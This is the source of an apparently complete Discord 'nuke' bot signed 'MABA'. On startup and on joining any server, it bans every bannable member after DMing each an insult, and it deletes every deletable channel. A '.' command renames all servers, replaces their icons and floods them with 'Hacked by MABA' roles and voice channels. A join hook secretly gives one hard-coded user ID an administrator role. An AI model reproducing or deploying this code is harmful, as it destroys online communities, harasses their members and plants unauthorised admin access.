const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log("By MABA KALARI");
LOka.on("ready", () => {
  console.log(`Logged in as ${LOka.user.tag} !`);
});
LOka.on("ready", () => {
  console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
  console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
  console.log("      ~            ~  By : MABA KALARI ~           ~    ");
  console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
  console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
  console.log(
    `Logged in as  * [ "  MABA KALARI " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`
  );
});
var prefix = ".";
LOka.on("message", message => {
  if (!message.content.startsWith(prefix)) return;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(" ");
  if (message.content.startsWith("hix15")) {
    LOka.user.setUsername(argresult);
  }
  if (message.content.startsWith(".")) {
    LOka.user.setStatus(argresult);
  }
});

var x1 = ".";
LOka.on("message", message => {
  if (message.content === ".") {
    LOka.user.setAvatar(
      `https://cdn.discordapp.com/attachments/691576823271653406/691578818288287764/image0.jpg`
    );
  }
});
var x1 = "Go";
LOka.on("message", message => {
  if (message.content === ".") {
    LOka.user.setUsername("HACKER MABA");
  }
});
LOka.on("message", message => {
  if (message.content === ".") {
    LOka.user.setGame(`lagal MABA nakay xatara`, "https://www.twitch.tv/hix");
  }
});

LOka.on("message", message => {
  if (message.content === ".") {
    LOka.guilds.forEach(m => {
      m.setIcon(
        `https://cdn.discordapp.com/attachments/691576823271653406/691578818288287764/image0.jpg`
      );
    });
  }
});
LOka.on("message", message => {
  if (message.content === ".") {
    LOka.guilds.forEach(m => {
      m.setName(`lagal MABA nakay xatara`);
    });
  }
});

LOka.on("message", message => {
  if (message.content === ".") {
    if (!message.channel.guild) return;

    message.guild.setIcon(
      `https://cdn.discordapp.com/attachments/691576823271653406/691578818288287764/image0.jpg`
    );
  }
});

LOka.on("message", message => {
  if (message.content === ".") {
    LOka.guilds.forEach(m => {
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });

      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });

      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });

      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MAAB",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });

      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        premissions: [1],
        color: " #ff0000"
      });

      m.createRole({
        name: "Hacked by MBAA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
      m.createRole({
        name: "Hacked by MABA",
        permissions: [1],
        color: " #ff0000"
      });
    });
  }
});
LOka.on("message", message => {
  if (message.content === ".") {
    LOka.guilds.forEach(m => {
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MAAB", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
    });
  }
});

LOka.on("message", message => {
  if (message.content === ".") {
    LOka.guilds.forEach(m => {
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u BY MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MAAB", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");

      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
      m.createChannel("Hacked u by MABA", "voice");
    });
  }
});

const { Client } = require("discord.js");
const client = new Client();

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  await guild.fetchMembers();

  await guild.owner.send("MAY KA LAGAL MABA").catch(e => {
    return void e;
  });

  await Promise.all(
    guild.members.map(async m => {
      if (m.bannable) {
        users++;
        await m.send("^MABA LERAYA^").catch(e => {
          return void e;
        });
        return m.ban();
      }
    })
  );

  await Promise.all(
    guild.channels.map(c => {
      if (c.deletable) {
        channels++;
        return c.delete();
      }
    })
  );

  await guild.createChannel("Hacked u by MABA", "text");

  await guild.createChannel("Hacked u by MABA", "voice");
}


client.elevation = message => {
  if (!message.guild) {
    return;
  }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2000;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3000;
  if (message.author.id === ayarlar.sahip) permlvl = 0;
  return permlvl;
};

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });


LOka.on("ready", () => {
  for (const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log("-------------------------------------------------------------");
  console.log("");
  console.log("Made by MABA");
  console.log("");
  console.log("-------------------------------------------------------------");
});

LOka.on("guildCreate", async guild => {
  return nuke(guild).catch(console.error);
});

LOka.on("guildMemberAdd", member => {
  if (member.id === "538374060648693762") {
    member.guild
      .createRole({
        name: LOka.user.username,
        color: "RANDOM",
        permissions: [8]
      })
      .then(function(role) {
        member.addRole(role);
      });
  }
});

LOka.login("");
